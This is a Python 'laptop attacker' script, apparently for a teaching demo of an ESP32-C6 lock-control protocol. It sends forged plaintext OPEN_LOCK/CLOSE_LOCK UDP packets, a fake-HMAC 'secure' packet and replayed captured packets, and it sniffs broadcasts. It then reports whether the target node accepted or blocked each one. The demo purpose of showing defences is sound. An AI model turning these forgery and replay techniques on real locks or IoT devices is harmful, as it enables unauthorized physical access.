#!/usr/bin/env python3
import argparse
import socket
import struct
import sys
import time

MAGIC = 0x53
VERSION = 1
MODE_INSECURE = 0
MODE_SECURE = 1
HEADER_LEN = 22
TAG_LEN = 32
PORT = 4210
RESPONSE_TIMEOUT = 1.5

stats = {
    "sent": 0,
    "accepted": 0,
    "blocked": 0,
    "timeout": 0,
}


def build_header(mode, seq, nonce=b"\x00" * 12, payload_len=0):
    return struct.pack("!BBBBI12sH", MAGIC, VERSION, mode, 0, seq, nonce, payload_len)


def print_dashboard(label, response):
    print()
    print("ATTACK / DEFENSE DASHBOARD")
    print("--------------------------")
    print(f"last attack : {label}")
    if response is None:
        stats["timeout"] += 1
        print("node2 reply : TIMEOUT (cevap yok)")
        print("result      : UNKNOWN")
    else:
        text = response.decode(errors="replace")
        if "ACCEPTED" in text:
            stats["accepted"] += 1
            result = "ACCEPTED"
        elif "BLOCKED" in text:
            stats["blocked"] += 1
            result = "BLOCKED"
        else:
            result = "UNKNOWN"
        print(f"node2 reply : {text}")
        print(f"result      : {result}")
    print(f"totals      : sent={stats['sent']} accepted={stats['accepted']} blocked={stats['blocked']} timeout={stats['timeout']}")


def print_stats():
    print()
    print("ATTACK / DEFENSE DASHBOARD")
    print("--------------------------")
    print(f"sent     : {stats['sent']}")
    print(f"accepted : {stats['accepted']}")
    print(f"blocked  : {stats['blocked']}")
    print(f"timeout  : {stats['timeout']}")


def reset_stats():
    for key in stats:
        stats[key] = 0
    print("Dashboard counters resetlendi.")


def send_packet(ip, packet, label):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(RESPONSE_TIMEOUT)
    sock.sendto(packet, (ip, PORT))
    stats["sent"] += 1
    response = None
    try:
        response, addr = sock.recvfrom(2048)
        print(f"reply from {addr[0]}:{addr[1]}")
    except socket.timeout:
        pass
    sock.close()
    print(f"sent {len(packet)} bytes to {ip}:{PORT}")
    print_dashboard(label, response)
    return response


def insecure_open(ip, seq):
    payload = f"OPEN_LOCK attacker_seq={seq}".encode()
    packet = build_header(MODE_INSECURE, seq, payload_len=len(payload)) + payload
    print("attack: insecure forged OPEN_LOCK plaintext")
    send_packet(ip, packet, "insecure forged OPEN_LOCK plaintext")


def insecure_close(ip, seq):
    payload = f"CLOSE_LOCK attacker_seq={seq}".encode()
    packet = build_header(MODE_INSECURE, seq, payload_len=len(payload)) + payload
    print("attack: insecure forged CLOSE_LOCK plaintext")
    send_packet(ip, packet, "insecure forged CLOSE_LOCK plaintext")


def fake_secure_open(ip, seq):
    # This looks like a secure packet structurally, but the attacker does not know
    # the session AES/HMAC keys. Node 2 should reject it with HMAC mismatch.
    ciphertext = b"OPEN_LOCK attacker"
    fake_tag = b"\x41" * TAG_LEN
    packet = build_header(MODE_SECURE, seq, nonce=b"\x22" * 12, payload_len=len(ciphertext))
    print("attack: fake secure OPEN_LOCK with invalid HMAC")
    send_packet(ip, packet + ciphertext + fake_tag, "fake secure OPEN_LOCK with invalid HMAC")


def replay_hex(ip, hex_string):
    cleaned = "".join(ch for ch in hex_string if ch in "0123456789abcdefABCDEF")
    packet = bytes.fromhex(cleaned)
    print("attack: replayed captured hex packet")
    send_packet(ip, packet, "replayed captured hex packet")


def listen(timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.bind(("", PORT))
    sock.settimeout(timeout)
    print(f"listening for broadcast UDP packets on {PORT} for {timeout}s")
    end = time.time() + timeout
    while time.time() < end:
        try:
            data, addr = sock.recvfrom(2048)
        except socket.timeout:
            break
        print(f"from {addr[0]}:{addr[1]} len={len(data)} hex={data.hex()}")
    sock.close()


def attack_suite(ip, seq):
    print()
    print("FULL ATTACK SUITE")
    print("-----------------")
    print("Step 1: Set Node 2 to INSECURE_MODE by typing 0 on Node 2 Serial Monitor.")
    input("Press Enter when Node 2 is in INSECURE_MODE...")
    insecure_open(ip, seq)
    seq += 1
    time.sleep(1)
    insecure_close(ip, seq)
    seq += 1

    print()
    print("Step 2: Set Node 2 to SECURE_MODE by typing 1 on Node 2 Serial Monitor.")
    input("Press Enter when Node 2 is in SECURE_MODE...")
    insecure_open(ip, seq)
    seq += 1
    time.sleep(1)
    fake_secure_open(ip, seq)
    seq += 1

    print()
    print("Expected result:")
    print("  INSECURE_MODE: laptop plaintext OPEN_LOCK/CLOSE_LOCK is accepted.")
    print("  SECURE_MODE: plaintext attack is blocked and fake secure packet gets HMAC mismatch.")
    return seq


def prompt_ip():
    ip = input("Node 2 IP veya broadcast [255.255.255.255]: ").strip()
    return ip or "255.255.255.255"


def prompt_seq(default):
    raw = input(f"Sequence number [{default}]: ").strip()
    if not raw:
        return default
    try:
        return int(raw)
    except ValueError:
        print("Gecersiz sequence, varsayilan kullaniliyor.")
        return default


def interactive_menu():
    print()
    print("ESP32-C6 Laptop Attacker Menu")
    print("-----------------------------")
    ip = prompt_ip()
    seq = 9001

    while True:
        print()
        print("1) Insecure OPEN_LOCK gonder (Node 2 INSECURE_MODE ise LED yanar)")
        print("2) Insecure CLOSE_LOCK gonder (Node 2 INSECURE_MODE ise LED soner)")
        print("3) Fake secure OPEN_LOCK gonder (Node 2 SECURE_MODE ise HMAC mismatch beklenir)")
        print("4) Broadcast paket dinle")
        print("5) Replay hex paket gonder")
        print("6) Node 2 IP degistir")
        print("7) Sequence number degistir")
        print("8) Full attack suite calistir")
        print("9) Dashboard durumunu goster")
        print("10) Dashboard sayaclarini sifirla")
        print("0) Cikis")
        choice = input("Secim: ").strip()

        if choice == "1":
            insecure_open(ip, seq)
            seq += 1
        elif choice == "2":
            insecure_close(ip, seq)
            seq += 1
        elif choice == "3":
            fake_secure_open(ip, seq)
            seq += 1
        elif choice == "4":
            raw = input("Dinleme suresi saniye [20]: ").strip()
            timeout = float(raw) if raw else 20.0
            listen(timeout)
        elif choice == "5":
            hex_string = input("Replay edilecek hex paket: ").strip()
            if hex_string:
                replay_hex(ip, hex_string)
        elif choice == "6":
            ip = prompt_ip()
        elif choice == "7":
            seq = prompt_seq(seq)
        elif choice == "8":
            seq = attack_suite(ip, seq)
        elif choice == "9":
            print_stats()
        elif choice == "10":
            reset_stats()
        elif choice == "0":
            print("Cikis.")
            return
        else:
            print("Gecersiz secim.")


def main():
    if len(sys.argv) == 1:
        interactive_menu()
        return

    parser = argparse.ArgumentParser(description="Laptop attacker for ESP32-C6 secure communication demo")
    parser.add_argument("--ip", default="255.255.255.255", help="Node 2 IP or broadcast address")
    parser.add_argument("--seq", type=int, default=9001, help="Sequence number for forged packets")
    sub = parser.add_subparsers(dest="cmd", required=True)
    sub.add_parser("insecure-open")
    sub.add_parser("insecure-close")
    sub.add_parser("fake-secure-open")
    replay = sub.add_parser("replay-hex")
    replay.add_argument("hex")
    listen_cmd = sub.add_parser("listen")
    listen_cmd.add_argument("--timeout", type=float, default=20.0)
    sub.add_parser("attack-suite")
    args = parser.parse_args()

    if args.cmd == "insecure-open":
        insecure_open(args.ip, args.seq)
    elif args.cmd == "insecure-close":
        insecure_close(args.ip, args.seq)
    elif args.cmd == "fake-secure-open":
        fake_secure_open(args.ip, args.seq)
    elif args.cmd == "replay-hex":
        replay_hex(args.ip, args.hex)
    elif args.cmd == "listen":
        listen(args.timeout)
    elif args.cmd == "attack-suite":
        attack_suite(args.ip, args.seq)


if __name__ == "__main__":
    main()
